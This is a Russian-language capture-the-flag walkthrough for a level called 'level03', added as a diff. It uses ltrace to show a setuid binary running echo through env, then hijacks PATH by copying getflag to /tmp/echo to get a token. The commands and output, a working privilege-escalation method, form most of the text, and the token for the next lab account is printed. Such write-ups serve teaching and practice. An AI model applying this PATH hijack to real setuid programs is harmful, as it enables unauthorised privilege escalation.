@@ -1,0 +1,34 @@
+На этот раз в нашей папке находим бинарный файл level03
+
+> ltrace ./level03  с помощью этой команды мы можем отследить вызовы библиотек при выполнении программы
+
+getegid()                                                                 = 2003
+geteuid()                                                                 = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                       = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                       = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+
+Из этого делаем вывод что "Exploit me" распечатано посредством команды echo, а не printf.
+
+> env		(вывод списка всех переменных окружения, мы ищем где расположен PATH)
+-> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+> export PATH="/tmp:$PATH"(объявляем переменную PATH, изменяем ее адресс)
+
+> env		(проверяем изменился ли PATH) 
+-> PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+> which getflag (Узнаем где находится команда getflag)
+
+> cp /bin/getflag /tmp/echo (Копируем исполняющий файл getflag в папку tmp с именем echo, в таком случае при запуске команды echo Linux будет искать исполняющий файл в PATH, в первую очередь в папке /tmp, но там он вызовет запуск программы getflag вместо echo)
+
+> ./level03
+-> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+> su flag03
+Password: qi0maab88jeaj46qoumi7maus
+-> su: Authentication failure 
+
+Токен подошел под юзера level04:
+> su level04
+Password: qi0maab88jeaj46qoumi7maus
